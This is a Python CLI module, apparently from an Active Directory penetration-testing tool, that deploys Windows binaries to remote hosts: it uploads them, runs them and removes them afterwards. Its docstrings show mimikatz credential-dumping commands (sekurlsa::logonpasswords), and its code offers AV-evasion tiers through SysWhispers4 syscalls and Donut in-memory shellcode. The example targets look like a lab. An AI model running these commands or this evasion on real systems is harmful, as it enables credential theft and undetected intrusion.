"""CLI orchestration for Windows binary deployment (upload → execute → cleanup).

Commands
--------
``do_binary_ops`` – Interactive wizard:
    1. Select domain (from workspace)
    2. Select target host (from enabled_computers.txt)
    3. Select binary from the catalog (or enter a custom path)
    4. Select authentication (credential or ccache)
    5. Choose preparation tier (Tier 1 prebuilt / Tier 2 SysWhispers4 / Tier 3 Donut)
    6. Choose or type execution arguments
    7. Upload → run → display output → cleanup

``do_deploy_binary`` – Non-interactive version for scripting / follow-up calls::

    deploy_binary mimikatz 10.10.10.5 garfield.htb Administrator <pass> \\
        "privilege::debug sekurlsa::logonpasswords exit"
"""

from __future__ import annotations

from pathlib import Path
from typing import Any, Protocol

from rich.prompt import Confirm, Prompt

from adscan_internal import (
    print_error,
    print_exception,
    print_info,
    print_info_verbose,
    print_operation_header,
    print_success,
    print_warning,
    telemetry,
)
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.services.exploitation.binary_ops import (
    BinaryDeployService,
    WINDOWS_BINARY_CATALOG,
    WindowsBinary,
    donut_available,
    is_cached,
    list_binaries,
    syswhispers4_available,
)
from adscan_internal.services.exploitation.remote_windows_execution import (
    RemoteWindowsAuth,
)
from adscan_internal.workspaces.computers import load_enabled_computer_samaccounts


# ---------------------------------------------------------------------------
# Shell Protocol
# ---------------------------------------------------------------------------


class BinaryOpsShell(Protocol):
    """Minimal shell surface consumed by this CLI module."""

    netexec_path: str | None
    domains_data: dict
    domain: str | None
    current_workspace_dir: str
    domains_dir: str

    def _questionary_select(
        self,
        title: str,
        options: list[str],
        default_idx: int = 0,
    ) -> int | None: ...

    def build_auth_nxc(
        self,
        username: str,
        secret: str,
        domain: str,
        kerberos: bool = False,
    ) -> str: ...

    def _get_lab_slug(self) -> str | None: ...


# ---------------------------------------------------------------------------
# Public CLI entry points
# ---------------------------------------------------------------------------


def do_binary_ops(shell: Any, args: str) -> None:
    """Interactive binary deploy wizard.

    Usage: binary_ops [domain]
    """
    try:
        _run_binary_ops_interactive(shell, args.strip() if args else "")
    except KeyboardInterrupt:
        print_info("\nCancelled.")
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error(f"Unexpected error in binary_ops: {exc}")
        print_exception(exception=exc)


def do_deploy_binary(shell: Any, args: str) -> None:
    """Non-interactive binary deploy.

    Usage: deploy_binary <binary_name> <host> <domain> <username> <secret> [args]

    Example:
        deploy_binary mimikatz 10.10.10.5 garfield.htb administrator S3cret! \\
            "privilege::debug sekurlsa::logonpasswords exit"
    """
    tokens = args.split(None, 5)
    if len(tokens) < 5:
        print_error(
            "Usage: deploy_binary <binary> <host> <domain> <user> <secret> [exec_args]"
        )
        return

    binary_name, host, domain, username, secret = tokens[:5]
    exec_args = tokens[5] if len(tokens) > 5 else ""

    binary = WINDOWS_BINARY_CATALOG.get(binary_name.lower())
    if binary is None:
        print_error(
            f"Unknown binary '{binary_name}'. "
            f"Available: {', '.join(WINDOWS_BINARY_CATALOG)}"
        )
        return

    auth = _build_auth(shell, domain=domain, host=host, username=username, secret=secret)
    _execute_deploy(shell, binary=binary, auth=auth, exec_args=exec_args, tier=1)


# ---------------------------------------------------------------------------
# Interactive wizard
# ---------------------------------------------------------------------------


def _run_binary_ops_interactive(shell: Any, domain_hint: str) -> None:
    """Full interactive wizard: domain → host → binary → auth → tier → args → deploy."""

    # --- Step 1: domain ---
    domain = _select_domain(shell, domain_hint)
    if not domain:
        return

    # --- Step 2: target host ---
    host = _select_host(shell, domain)
    if not host:
        return

    # --- Step 3: binary ---
    binary = _select_binary(shell)
    if binary is None:
        return

    # --- Step 4: auth ---
    auth = _select_auth(shell, domain=domain, host=host)
    if auth is None:
        return

    # --- Step 5: preparation tier ---
    tier = _select_tier(shell, binary)

    # --- Step 6: execution arguments ---
    exec_args = _select_exec_args(shell, binary)

    # --- Step 7: remote directory ---
    remote_dir = _select_remote_dir(binary)

    # --- Step 8: confirm & deploy ---
    _print_deploy_summary(binary, auth, tier, exec_args, remote_dir)
    if not Confirm.ask("Proceed?", default=True):
        print_info("Cancelled.")
        return

    _execute_deploy(
        shell,
        binary=binary,
        auth=auth,
        exec_args=exec_args,
        tier=tier,
        remote_dir=remote_dir,
    )


# ---------------------------------------------------------------------------
# Selection helpers
# ---------------------------------------------------------------------------


def _select_domain(shell: Any, hint: str) -> str | None:
    domains = list(getattr(shell, "domains_data", {}).keys())
    if not domains:
        print_error("No domains configured. Run the enumeration phase first.")
        return None

    if hint and hint in domains:
        return hint

    current = getattr(shell, "domain", None)
    if len(domains) == 1:
        return domains[0]

    default_idx = domains.index(current) if current in domains else 0
    selector = getattr(shell, "_questionary_select", None)
    if selector is None:
        return domains[0]

    idx = selector("Select domain:", domains, default_idx)
    if idx is None:
        return None
    return domains[idx]


def _select_host(shell: Any, domain: str) -> str | None:
    """Return target host FQDN or IP selected by the user."""
    workspace_dir = getattr(shell, "current_workspace_dir", "")
    domains_dir = getattr(shell, "domains_dir", "domains")

    # Build options from enabled_computers.txt + PDC fallback
    fqdn_list: list[str] = []
    try:
        samaccounts = load_enabled_computer_samaccounts(workspace_dir, domains_dir, domain)
        for sam in samaccounts:
            hostname = sam.rstrip("$")
            fqdn_list.append(f"{hostname}.{domain}".lower())
    except OSError:
        pass

    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
    pdc = str(domain_data.get("pdc") or "").strip()
    if pdc and pdc not in fqdn_list:
        fqdn_list.insert(0, pdc)

    options = fqdn_list + ["[ Enter manually ]"]
    selector = getattr(shell, "_questionary_select", None)

    if not fqdn_list:
        raw = Prompt.ask("Target host (FQDN or IP)")
        return raw.strip() or None

    idx = selector("Select target host:", options) if selector else 0
    if idx is None:
        return None

    if options[idx] == "[ Enter manually ]":
        raw = Prompt.ask("Target host (FQDN or IP)")
        return raw.strip() or None

    return options[idx]


def _select_binary(shell: Any) -> WindowsBinary | None:
    """Selector for a binary from the catalog."""
    binaries = list_binaries()
    options = [
        f"{b.display_name:<18} – {b.description}"
        for b in binaries
    ] + ["[ Custom local path ]"]

    selector = getattr(shell, "_questionary_select", None)
    idx = selector("Select binary to deploy:", options) if selector else 0
    if idx is None:
        return None

    if options[idx] == "[ Custom local path ]":
        return _select_custom_binary()

    return binaries[idx]


def _select_custom_binary() -> WindowsBinary | None:
    """Let the user provide a local binary path not in the catalog."""
    path = Prompt.ask("Local binary path")
    path = path.strip()
    if not path or not Path(path).is_file():
        print_error(f"File not found: {path}")
        return None

    filename = Path(path).name
    # Create an ad-hoc catalog entry pointing to the file on disk
    # We patch the cache directory so preparer.ensure_binary returns it directly
    _patch_custom_binary_cache(path, filename)

    return WindowsBinary(
        name="_custom",
        display_name=filename,
        description="Custom local binary",
        filename=filename,
        scenarios=("custom",),
        tier=1,
        download_url="",
    )


def _patch_custom_binary_cache(src_path: str, filename: str) -> None:
    """Copy a custom binary to the expected cache location so preparer finds it."""
    from pathlib import Path

    cache_dir = Path.home() / ".adscan" / "tools" / "windows-tools" / "_custom"
    cache_dir.mkdir(parents=True, exist_ok=True)
    dest = cache_dir / filename
    if not dest.exists() or Path(src_path).stat().st_mtime > dest.stat().st_mtime:
        import shutil

        shutil.copy2(src_path, dest)


def _select_auth(shell: Any, domain: str, host: str) -> RemoteWindowsAuth | None:
    """Build RemoteWindowsAuth by selecting from stored credentials + ccache tickets."""
    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
    credentials: dict = domain_data.get("credentials", {})
    kerberos_tickets: dict = domain_data.get("kerberos_tickets", {})

    options: list[tuple[str, str, str]] = []  # (label, username, secret)

    # Stored password credentials
    for ukey, cred_data in credentials.items():
        username = str(cred_data.get("username") or ukey.split("\\")[-1])
        secret = str(cred_data.get("password") or cred_data.get("hash") or "")
        if secret:
            kind = "hash" if len(secret) == 32 and all(c in "0123456789abcdefABCDEF" for c in secret) else "password"
            options.append((f"{username} ({kind})", username, secret))

    # Kerberos ccache tickets
    for username, ticket_path in kerberos_tickets.items():
        if ticket_path and Path(ticket_path).is_file():
            options.append((f"{username} (ccache: {Path(ticket_path).name})", username, ticket_path))

    # Workspace-level ccache files (like the Garfield administrator ccache)
    workspace_dir = getattr(shell, "current_workspace_dir", "")
    if workspace_dir:
        for ccache_file in Path(workspace_dir).glob("*.ccache"):
            label = ccache_file.name
            username = label.split("@")[0] if "@" in label else "unknown"
            already = any(opt[2] == str(ccache_file) for opt in options)
            if not already:
                options.append((f"{username} (ccache: {label})", username, str(ccache_file)))

    options.append(("[ Enter manually ]", "", ""))

    labels = [opt[0] for opt in options]
    selector = getattr(shell, "_questionary_select", None)
    idx = selector("Select authentication:", labels) if selector and labels else 0
    if idx is None:
        return None

    if options[idx][0] == "[ Enter manually ]":
        username = Prompt.ask("Username")
        secret = Prompt.ask("Password / NTLM hash / ccache path", password=True)
        if not username or not secret:
            print_error("Username and secret are required.")
            return None
    else:
        _, username, secret = options[idx]

    nxc_auth = None
    build_auth = getattr(shell, "build_auth_nxc", None)
    if callable(build_auth):
        is_ccache = str(secret).lower().endswith(".ccache")
        nxc_auth = str(build_auth(username, secret, domain, kerberos=is_ccache))

    return RemoteWindowsAuth(
        domain=domain,
        host=host,
        username=username,
        secret=secret,
        nxc_auth=nxc_auth,
    )


def _select_tier(shell: Any, binary: WindowsBinary) -> int:
    """Let the user choose the preparation tier."""
    tier_options: list[tuple[str, int]] = [
        ("Tier 1 – Prebuilt   (download pre-compiled binary, fastest)", 1),
    ]
    if syswhispers4_available():
        tier_options.append(
            ("Tier 2 – SysWhispers4 (compile from source with direct syscall stubs, AV bypass)", 2)
        )
    else:
        tier_options.append(
            ("Tier 2 – SysWhispers4 (not available – run 'adscan install' to enable)", 2)
        )
    if donut_available():
        tier_options.append(
            ("Tier 3 – Donut shellcode (reflective in-memory execution, maximum evasion)", 3)
        )
    else:
        tier_options.append(
            ("Tier 3 – Donut shellcode (not available – run 'adscan install' to enable)", 3)
        )

    labels = [t[0] for t in tier_options]
    selector = getattr(shell, "_questionary_select", None)
    idx = selector("Preparation tier:", labels) if selector else 0
    if idx is None:
        return 1

    selected_tier = tier_options[idx][1]

    # Warn and fallback when the selected tier requires a missing tool
    if selected_tier == 2 and not syswhispers4_available():
        print_warning(
            "SysWhispers4 / mingw-w64 not installed. Falling back to Tier 1. "
            "Run 'adscan install' to enable Tier 2."
        )
        return 1
    if selected_tier == 3 and not donut_available():
        print_warning(
            "Donut not installed. Falling back to Tier 1. "
            "Run 'adscan install' to enable Tier 3."
        )
        return 1

    return selected_tier


def _select_exec_args(shell: Any, binary: WindowsBinary) -> str:
    """Let the user pick a preset argument set or type custom args."""
    presets = list(binary.common_args) if binary.common_args else []
    options = presets + ["[ Custom arguments ]", "[ No arguments ]"]

    selector = getattr(shell, "_questionary_select", None)
    idx = selector("Execution arguments:", options) if selector else len(options) - 1
    if idx is None:
        return ""

    chosen = options[idx]
    if chosen == "[ No arguments ]":
        return ""
    if chosen == "[ Custom arguments ]":
        return Prompt.ask("Enter arguments").strip()
    return chosen


def _select_remote_dir(binary: WindowsBinary) -> str:
    default = binary.default_remote_dir
    answer = Prompt.ask("Remote destination directory", default=default)
    return answer.strip() or default


# ---------------------------------------------------------------------------
# Deploy execution
# ---------------------------------------------------------------------------


def _execute_deploy(
    shell: Any,
    *,
    binary: WindowsBinary,
    auth: RemoteWindowsAuth,
    exec_args: str,
    tier: int = 1,
    remote_dir: str | None = None,
) -> None:
    """Run the full prepare → upload → execute → cleanup pipeline."""
    masked_host = mark_sensitive(auth.host, "hostname")

    print_operation_header(
        "Binary Deployment",
        details={
            "Binary": binary.display_name,
            "Target": auth.host,
            "Domain": auth.domain,
            "User": auth.username,
            "Tier": f"{tier} ({'prebuilt' if tier == 1 else 'syswhispers4' if tier == 2 else 'donut'})",
            "Args": exec_args or "(none)",
        },
        icon="🚀",
    )

    cleanup = Confirm.ask("Delete binary from remote host after execution?", default=True)

    svc = BinaryDeployService(shell)
    result = svc.deploy_and_run(
        binary,
        auth,
        args=exec_args,
        tier=tier,
        remote_dir=remote_dir,
        cleanup=cleanup,
    )

    # --- render result ---
    if not result.prepared:
        print_error(
            "Binary preparation failed. "
            + (f"Place the binary at {result.local_path}" if result.local_path else "")
        )
        return

    if not result.uploaded:
        print_error(
            f"Upload to {masked_host} failed: {result.error_message or 'unknown error'}"
        )
        return

    if not result.executed:
        print_error(
            f"Execution on {masked_host} failed: {result.error_message or 'unknown error'}"
        )
        if result.stderr:
            print_info(f"stderr:\n{result.stderr}")
        return

    print_success(
        f"{binary.display_name} executed on {masked_host} via {result.transport}."
    )

    if result.stdout:
        from rich.console import Console
        from rich.syntax import Syntax

        print_info("[bold]Output:[/bold]")
        try:
            Console().print(Syntax(result.stdout, "text", theme="monokai", word_wrap=True))
        except Exception:  # noqa: BLE001
            print_info(result.stdout)

    if result.stderr:
        print_warning(f"stderr:\n{result.stderr}")

    if cleanup:
        if result.cleaned_up:
            print_info_verbose(f"Remote binary removed: {result.remote_path}")
        else:
            print_warning(
                f"Could not remove remote binary at {result.remote_path}. "
                "Remove it manually."
            )

    # telemetry
    try:
        telemetry.capture(
            "binary_deploy",
            {
                "binary": binary.name,
                "tier": tier,
                "transport": result.transport,
                "success": result.success,
                "cleanup": cleanup,
            },
        )
    except Exception:  # noqa: BLE001
        pass


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _build_auth(
    shell: Any,
    *,
    domain: str,
    host: str,
    username: str,
    secret: str,
) -> RemoteWindowsAuth:
    nxc_auth = None
    build_fn = getattr(shell, "build_auth_nxc", None)
    if callable(build_fn):
        is_ccache = str(secret).lower().endswith(".ccache")
        nxc_auth = str(build_fn(username, secret, domain, kerberos=is_ccache))
    return RemoteWindowsAuth(
        domain=domain,
        host=host,
        username=username,
        secret=secret,
        nxc_auth=nxc_auth,
    )


def _print_deploy_summary(
    binary: WindowsBinary,
    auth: RemoteWindowsAuth,
    tier: int,
    exec_args: str,
    remote_dir: str,
) -> None:
    tier_labels = {1: "Tier 1 (prebuilt)", 2: "Tier 2 (SysWhispers4)", 3: "Tier 3 (Donut)"}
    cached = is_cached(binary, tier=tier)

    print_info("[bold]── Deploy plan ──────────────────────────────────────[/bold]")
    print_info(f"  Binary    : {binary.display_name} ({binary.filename})")
    print_info(f"  Host      : {mark_sensitive(auth.host, 'hostname')}")
    print_info(f"  Auth      : {mark_sensitive(auth.username, 'user')} @ {auth.domain}")
    print_info(f"  Tier      : {tier_labels.get(tier, str(tier))}")
    print_info(f"  Cached    : {'yes' if cached else 'no – will download/compile'}")
    print_info(f"  Remote dir: {remote_dir}")
    print_info(f"  Args      : {exec_args or '(none)'}")
    print_info("[bold]─────────────────────────────────────────────────────[/bold]")


__all__ = [
    "do_binary_ops",
    "do_deploy_binary",
]
